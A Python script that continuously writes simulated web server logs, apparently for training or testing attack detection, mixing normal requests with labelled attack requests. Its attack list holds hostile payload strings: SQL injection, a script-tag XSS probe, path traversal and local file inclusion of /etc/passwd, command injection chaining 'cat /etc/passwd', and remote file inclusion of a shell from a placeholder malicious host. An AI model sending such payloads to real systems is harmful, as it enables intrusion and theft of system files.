import os
import random
import time
import datetime

# Ensure the logs directory exists
log_dir = "../logs"
os.makedirs(log_dir, exist_ok=True)

# Function to generate random IP addresses
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# List of user agents (Normal & Malicious)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "sqlmap/1.4.4#dev (http://sqlmap.org)",  # SQL Injection tool
    "Nmap Scripting Engine",  # Reconnaissance tool
    "Nikto/2.1.5 (Evasion: 1)",  # Web vulnerability scanner
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",  # Web crawler
    "Python-urllib/3.9",  # Automated script
    "Wget/1.21.1 (linux-gnu)",  # Command-line downloader
    "BurpSuite Professional",  # Security testing tool
    "Metasploit",# Exploit framewor
    "Duck Duck Go",
    "Chrome Browser",      
]

# List of legitimate requests
legitimate_requests = [
    {"type": "HOME_PAGE", "request": "GET /", "status": 200},
    {"type": "PRODUCT_PAGE", "request": "GET /products", "status": 200},
    {"type": "CHECKOUT", "request": "POST /checkout", "status": 200},
    {"type": "USER_LOGIN", "request": "POST /login", "status": random.choice([200, 401])},
    {"type": "PROFILE_UPDATE", "request": "POST /profile/update", "status": 200},
]

# List of attack patterns with varying success
attack_patterns = [
    {"type": "BRUTE_FORCE", "request": "POST /login", "status": random.choice([200, 401])},
    {"type": "SQL_INJECTION", "request": "GET /search?q=' OR '1'='1", "status": random.choice([200, 403])},
    {"type": "XSS_ATTACK", "request": "GET /profile?name=<script>alert('Hacked!')</script>", "status": random.choice([200, 403])},
    {"type": "DDoS", "request": "GET /", "status": 200},
    {"type": "ADMIN_ACCESS", "request": "GET /admin", "status": random.choice([200, 403])},
    {"type": "PATH_TRAVERSAL", "request": "GET /etc/passwd", "status": random.choice([200, 403])},
    {"type": "REMOTE_FILE_INCLUSION", "request": "GET /index.php?page=http://malicious.com/shell.txt", "status": random.choice([200, 403])},
    {"type": "COMMAND_INJECTION", "request": "GET /ping?ip=127.0.0.1;cat /etc/passwd", "status": random.choice([200, 403])},
    {"type": "LFI_ATTACK", "request": "GET /index.php?page=../../../../etc/passwd", "status": random.choice([200, 403])},
    {"type": "USER_ENUMERATION", "request": "POST /wp-json/wp/v2/users", "status": random.choice([200, 403])},
    {"type": "CSRF_ATTACK", "request": "POST /change-email?email=attacker@example.com", "status": random.choice([200, 403])},
    {"type": "RCE_ATTACK", "request": "GET /execute?cmd=whoami", "status": random.choice([200, 403])},
    {"type": "XXE_ATTACK", "request": "POST /upload-xml", "status": random.choice([200, 403])},
    {"type": "API_ABUSE", "request": "GET /api/user?username=admin", "status": random.choice([200, 403])},
]

# Function to generate logs with diverse patterns
def generate_logs(filename, num_entries=50, include_legitimate=True):
    with open(filename, "a") as log_file:
        for _ in range(num_entries):
            ip = generate_random_ip()
            user_agent = random.choice(user_agents)
            if include_legitimate and random.random() > 0.3:
                request_data = random.choice(legitimate_requests)
            else:
                request_data = random.choice(attack_patterns)
            timestamp = (datetime.datetime.now() - datetime.timedelta(seconds=random.randint(1, 60))).strftime("%d/%b/%Y:%H:%M:%S +0000")
            
            log_entry = f'{ip} - - [{timestamp}] "{request_data["request"]} HTTP/1.1" {request_data["status"]} {random.randint(500, 5000)} "{user_agent}"'
            log_file.write(log_entry + "\n")
    
    print(f"✅ Generated {num_entries} log entries in {filename}")

# Run log generation every 2 seconds
while True:
    generate_logs("../logs/simulated_access.log", 150)  # More log entries for increased complexity
    generate_logs("../logs/simulated_auth.log", 75)
    generate_logs("../logs/simulated_attack.log", 50, include_legitimate=False)  # Separate log for attacks
    print("⏳ Waiting 2 seconds before updating logs...")
    time.sleep(2)

